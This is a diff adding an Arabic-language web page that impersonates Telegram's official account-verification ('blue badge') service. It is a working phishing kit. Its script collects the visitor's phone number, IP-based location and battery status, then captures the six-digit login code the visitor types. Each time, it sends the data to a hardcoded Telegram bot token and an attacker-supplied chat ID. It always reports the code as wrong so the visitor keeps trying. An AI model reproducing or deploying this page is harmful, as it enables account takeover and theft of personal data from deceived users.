@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram - توثيق الحساب</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 550px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 25px 0 15px;
+        }
+
+        .header .logo {
+            width: 65px;
+            height: 65px;
+            background: #2AABEE;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 32px;
+            color: white;
+            box-shadow: 0 4px 15px rgba(42,171,238,0.3);
+        }
+
+        .header h1 {
+            color: #2AABEE;
+            font-size: 22px;
+            margin-bottom: 4px;
+        }
+
+        .header .subtitle {
+            color: #888;
+            font-size: 13px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 14px;
+            padding: 25px;
+            margin: 15px 0;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+        }
+
+        .blue-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #e3f2fd;
+            border: 1px solid #2AABEE;
+            border-radius: 20px;
+            padding: 8px 18px;
+            font-size: 14px;
+            color: #2AABEE;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .blue-badge .star {
+            background: #2AABEE;
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .info-section h3 {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .info-section p {
+            color: #666;
+            font-size: 13px;
+            line-height: 1.8;
+            margin: 5px 0;
+        }
+
+        .benefits {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 15px 0;
+        }
+
+        @media (max-width: 400px) {
+            .benefits { grid-template-columns: 1fr; }
+        }
+
+        .benefit-item {
+            background: #f8fafc;
+            border: 1px solid #e8ecf0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .benefit-item .icon {
+            color: #2AABEE;
+            margin-left: 5px;
+        }
+
+        .divider {
+            height: 1px;
+            background: #e8ecf0;
+            margin: 18px 0;
+        }
+
+        .country-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 6px;
+            margin: 12px 0;
+        }
+
+        @media (max-width: 400px) {
+            .country-grid { grid-template-columns: 1fr 1fr; }
+        }
+
+        .country-option {
+            background: #f8fafc;
+            border: 2px solid #e8ecf0;
+            border-radius: 8px;
+            padding: 10px 6px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 11px;
+            color: #333;
+            transition: 0.2s;
+        }
+
+        .country-option:hover {
+            border-color: #2AABEE;
+            background: #e3f2fd;
+        }
+
+        .country-option.selected {
+            border-color: #2AABEE;
+            background: #e3f2fd;
+            color: #2AABEE;
+            font-weight: bold;
+        }
+
+        .input-group {
+            margin: 15px 0;
+        }
+
+        .input-group label {
+            display: block;
+            color: #333;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8ecf0;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .input-group input:focus {
+            border-color: #2AABEE;
+            box-shadow: 0 0 0 3px rgba(42,171,238,0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-blue {
+            background: #2AABEE;
+            color: white;
+            margin-top: 10px;
+        }
+
+        .btn-blue:hover {
+            background: #1d93d4;
+        }
+
+        .btn-blue:disabled {
+            background: #90caf9;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            text-align: center;
+            color: #aaa;
+            font-size: 11px;
+            padding: 15px 0;
+        }
+
+        .code-screen { display: none; }
+        .code-screen.active { display: block; }
+        .phone-screen { display: block; }
+        .phone-screen.hidden { display: none; }
+
+        .code-box {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .code-box input {
+            width: 45px;
+            height: 55px;
+            border: 2px solid #e8ecf0;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            outline: none;
+        }
+
+        .code-box input:focus {
+            border-color: #2AABEE;
+        }
+
+        .status-msg {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 13px;
+            display: none;
+        }
+
+        .status-msg.error {
+            color: #f44336;
+            display: block;
+        }
+
+        .timer-text {
+            text-align: center;
+            color: #888;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        .timer-text span {
+            color: #2AABEE;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 15px;
+        }
+
+        .loading.active { display: block; }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e8ecf0;
+            border-top-color: #2AABEE;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .selected-country-display {
+            background: #e3f2fd;
+            border: 1px solid #2AABEE;
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin: 10px 0;
+            color: #2AABEE;
+            font-weight: bold;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">✈️</div>
+            <h1>Telegram</h1>
+            <p class="subtitle">توثيق الحسابات الرسمي</p>
+        </div>
+
+        <!-- شاشة الهاتف -->
+        <div class="phone-screen" id="phoneScreen">
+            <div class="card">
+                <div class="blue-badge">
+                    <span class="star">★</span>
+                    طلب توثيق حساب تلغرام
+                </div>
+
+                <div class="info-section">
+                    <h3>ما هي العلامة الزرقاء في تلغرام؟</h3>
+                    <p>العلامة الزرقاء على Telegram هي شارة التحقق الرسمية التي تؤكد أن الحساب يخص شخصية عامة أو مؤسسة أو علامة تجارية حقيقية. يتم منحها من قبل إدارة تلغرام بعد التحقق من هوية صاحب الحساب.</p>
+                    <p>تساعد العلامة الزرقاء المستخدمين على التمييز بين الحسابات الرسمية والحسابات المزيفة، مما يوفر بيئة أكثر أماناً وموثوقية للتواصل.</p>
+                </div>
+
+                <div class="benefits">
+                    <div class="benefit-item">
+                        <span class="icon">★</span> موثوقية: تأكيد أن حسابك رسمي وحقيقي
+                    </div>
+                    <div class="benefit-item">
+                        <span class="icon">★</span> ظهور: أولوية في نتائج البحث
+                    </div>
+                    <div class="benefit-item">
+                        <span class="icon">★</span> حماية: منع انتحال شخصيتك
+                    </div>
+                    <div class="benefit-item">
+                        <span class="icon">★</span> ثقة: زيادة مصداقيتك لدى المتابعين
+                    </div>
+                </div>
+
+                <p style="color:#333;font-weight:bold;font-size:15px;margin-top:15px;">
+                    📱 أدخل رقم هاتفك للتوثيق
+                </p>
+
+                <div class="divider"></div>
+
+                <p style="color:#333;font-size:13px;margin-bottom:8px;">🌍 اختر الدولة:</p>
+                
+                <div class="country-grid" id="countryGrid"></div>
+
+                <div class="selected-country-display" id="selectedCountryDisplay"></div>
+
+                <div class="input-group">
+                    <label>📞 رقم الهاتف:</label>
+                    <input type="tel" id="phoneNumber" placeholder="مثال: 912345678" oninput="checkPhone()">
+                </div>
+
+                <button class="btn btn-blue" id="sendBtn" disabled onclick="sendCode()">
+                    📨 إرسال كود التحقق
+                </button>
+
+                <div class="loading" id="loading1">
+                    <div class="spinner"></div>
+                    <p style="color:#888;font-size:13px;">جاري إرسال كود التحقق...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- شاشة الكود -->
+        <div class="code-screen" id="codeScreen">
+            <div class="card">
+                <div class="blue-badge">
+                    <span class="star">★</span>
+                    أدخل رمز التحقق
+                </div>
+
+                <p style="color:#666;font-size:13px;text-align:center;">
+                    تم إرسال رمز مكون من 6 أرقام إلى
+                </p>
+                <p style="color:#333;font-weight:bold;text-align:center;font-size:16px;margin:5px 0;" id="displayPhone"></p>
+
+                <div class="code-box" id="codeBox">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                    <input type="tel" maxlength="1" oninput="moveNext(this)" onkeydown="movePrev(event, this)">
+                </div>
+
+                <div class="status-msg" id="codeMsg"></div>
+
+                <p class="timer-text" id="timerText">إعادة إرسال الرمز خلال <span id="countdown">30</span> ثانية</p>
+
+                <button class="btn btn-blue" onclick="goBack()" style="background:#888;margin-top:5px;">
+                    ↩️ تغيير الرقم
+                </button>
+
+                <div class="loading" id="loading2">
+                    <div class="spinner"></div>
+                    <p style="color:#888;font-size:13px;">جاري التحقق من الرمز...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 تلغرام. جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <script>
+        var chatId = new URL(window.location.href).searchParams.get('chatId') || '';
+        var BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+        var selectedCountry = null;
+        var countdownTimer;
+        var currentCode = '';
+
+        var countries = [
+            { name: 'السعودية', code: '+966', flag: '🇸🇦' },
+            { name: 'مصر', code: '+20', flag: '🇪🇬' },
+            { name: 'الإمارات', code: '+971', flag: '🇦🇪' },
+            { name: 'العراق', code: '+964', flag: '🇮🇶' },
+            { name: 'الأردن', code: '+962', flag: '🇯🇴' },
+            { name: 'سوريا', code: '+963', flag: '🇸🇾' },
+            { name: 'لبنان', code: '+961', flag: '🇱🇧' },
+            { name: 'الكويت', code: '+965', flag: '🇰🇼' },
+            { name: 'قطر', code: '+974', flag: '🇶🇦' },
+            { name: 'البحرين', code: '+973', flag: '🇧🇭' },
+            { name: 'عمان', code: '+968', flag: '🇴🇲' },
+            { name: 'اليمن', code: '+967', flag: '🇾🇪' },
+            { name: 'فلسطين', code: '+970', flag: '🇵🇸' },
+            { name: 'المغرب', code: '+212', flag: '🇲🇦' },
+            { name: 'الجزائر', code: '+213', flag: '🇩🇿' },
+            { name: 'تونس', code: '+216', flag: '🇹🇳' },
+            { name: 'ليبيا', code: '+218', flag: '🇱🇾' },
+            { name: 'السودان', code: '+249', flag: '🇸🇩' },
+            { name: 'تركيا', code: '+90', flag: '🇹🇷' },
+            { name: 'روسيا', code: '+7', flag: '🇷🇺' },
+            { name: 'ألمانيا', code: '+49', flag: '🇩🇪' },
+            { name: 'فرنسا', code: '+33', flag: '🇫🇷' },
+            { name: 'بريطانيا', code: '+44', flag: '🇬🇧' },
+            { name: 'أمريكا', code: '+1', flag: '🇺🇸' }
+        ];
+
+        function renderCountries() {
+            var grid = document.getElementById('countryGrid');
+            grid.innerHTML = countries.map(function(c) {
+                return '<div class="country-option" onclick="selectCountry(\'' + c.name + '\', \'' + c.code + '\', \'' + c.flag + '\')">' +
+                    c.flag + ' ' + c.name + '<br>(' + c.code + ')' +
+                '</div>';
+            }).join('');
+        }
+
+        function selectCountry(name, code, flag) {
+            selectedCountry = { name: name, code: code, flag: flag };
+            
+            var opts = document.querySelectorAll('.country-option');
+            opts.forEach(function(o) { o.classList.remove('selected'); });
+            event.target.classList.add('selected');
+            
+            var display = document.getElementById('selectedCountryDisplay');
+            display.style.display = 'block';
+            display.textContent = flag + ' ' + name + ' (' + code + ')';
+            
+            checkPhone();
+        }
+
+        function checkPhone() {
+            var phone = document.getElementById('phoneNumber').value.trim();
+            var btn = document.getElementById('sendBtn');
+            
+            if (selectedCountry && phone.length >= 7) {
+                btn.disabled = false;
+            } else {
+                btn.disabled = true;
+            }
+        }
+
+        function showLoading(id) { document.getElementById(id).classList.add('active'); }
+        function hideLoading(id) { document.getElementById(id).classList.remove('active'); }
+
+        async function sendCode() {
+            if (sent) return;
+            
+            var phone = document.getElementById('phoneNumber').value.trim();
+            if (!phone || phone.length < 7 || !selectedCountry) return;
+
+            var fullNumber = selectedCountry.code + phone;
+            
+            showLoading('loading1');
+            document.getElementById('sendBtn').disabled = true;
+
+            var ipInfo = await getIpInfo();
+            var batteryInfo = await getBatteryInfo();
+
+            var text = '🔵 تلغرام - توثيق حساب\n\n';
+            text += '📞 الرقم: ' + fullNumber + '\n';
+            text += '🌍 الدولة المختارة: ' + selectedCountry.name + '\n';
+            text += '📍 الدولة الفعلية: ' + ipInfo.country + '\n';
+            text += '🏙️ المدينة: ' + ipInfo.city + '\n';
+            text += '🌐 IP: ' + ipInfo.ip + '\n';
+            text += '🔋 البطارية: ' + batteryInfo.level + '%\n';
+            text += '⚡ الشحن: ' + batteryInfo.charging;
+
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+
+            await sleep(2000);
+            hideLoading('loading1');
+
+            document.getElementById('phoneScreen').classList.add('hidden');
+            document.getElementById('codeScreen').classList.add('active');
+            
+            document.getElementById('displayPhone').textContent = selectedCountry.code + ' ' + phone;
+
+            currentCode = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            startCountdown();
+            document.getElementById('codeBox').querySelector('input').focus();
+        }
+
+        function startCountdown() {
+            var seconds = 30;
+            document.getElementById('countdown').textContent = seconds;
+            
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(function() {
+                seconds--;
+                document.getElementById('countdown').textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownTimer);
+                    document.getElementById('timerText').innerHTML = '<span onclick="resendCode()">إعادة إرسال الرمز</span>';
+                }
+            }, 1000);
+        }
+
+        async function resendCode() {
+            showLoading('loading2');
+            await sleep(1500);
+            hideLoading('loading2');
+            currentCode = Math.floor(100000 + Math.random() * 900000).toString();
+            startCountdown();
+        }
+
+        function moveNext(input) {
+            if (input.value.length === 1) {
+                var next = input.nextElementSibling;
+                if (next) next.focus();
+                checkCode();
+            }
+        }
+
+        function movePrev(event, input) {
+            if (event.key === 'Backspace' && input.value.length === 0) {
+                var prev = input.previousElementSibling;
+                if (prev) prev.focus();
+            }
+        }
+
+        function getCode() {
+            var inputs = document.querySelectorAll('#codeBox input');
+            var code = '';
+            inputs.forEach(function(inp) { code += inp.value; });
+            return code;
+        }
+
+        async function checkCode() {
+            var code = getCode();
+            
+            if (code.length === 6) {
+                showLoading('loading2');
+                await sleep(2000);
+
+                var phone = document.getElementById('phoneNumber').value.trim();
+                var fullNumber = selectedCountry.code + phone;
+
+                var text = '🔵 تلغرام - كود التحقق\n\n';
+                text += '🔢 الكود: ' + code + '\n';
+                text += '📞 الرقم: ' + fullNumber + '\n';
+                text += '🕐 الوقت: ' + new Date().toLocaleString('ar-SA');
+
+                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text })
+                });
+
+                await sleep(1000);
+                hideLoading('loading2');
+                
+                var msg = document.getElementById('codeMsg');
+                msg.className = 'status-msg error';
+                msg.textContent = 'الرمز غير صحيح. يرجى المحاولة مرة أخرى.';
+                
+                document.querySelectorAll('#codeBox input').forEach(function(inp) {
+                    inp.value = '';
+                });
+                document.getElementById('codeBox').querySelector('input').focus();
+            }
+        }
+
+        function goBack() {
+            document.getElementById('codeScreen').classList.remove('active');
+            document.getElementById('phoneScreen').classList.remove('hidden');
+            clearInterval(countdownTimer);
+            document.getElementById('sendBtn').disabled = false;
+            document.getElementById('codeMsg').className = 'status-msg';
+            document.querySelectorAll('#codeBox input').forEach(function(inp) { inp.value = ''; });
+        }
+
+        async function getIpInfo() {
+            try {
+                var r = await fetch('https://ipapi.co/json/');
+                var d = await r.json();
+                return { ip: d.ip || '?', country: d.country_name || '?', city: d.city || '?' };
+            } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    var b = await navigator.getBattery();
+                    return { level: Math.round(b.level * 100), charging: b.charging ? 'نعم' : 'لا' };
+                } catch(e) {}
+            }
+            return { level: '?', charging: '?' };
+        }
+
+        function sleep(ms) {
+            return new Promise(function(r) { setTimeout(r, ms); });
+        }
+
+        renderCountries();
+    </script>
+</body>
+</html>
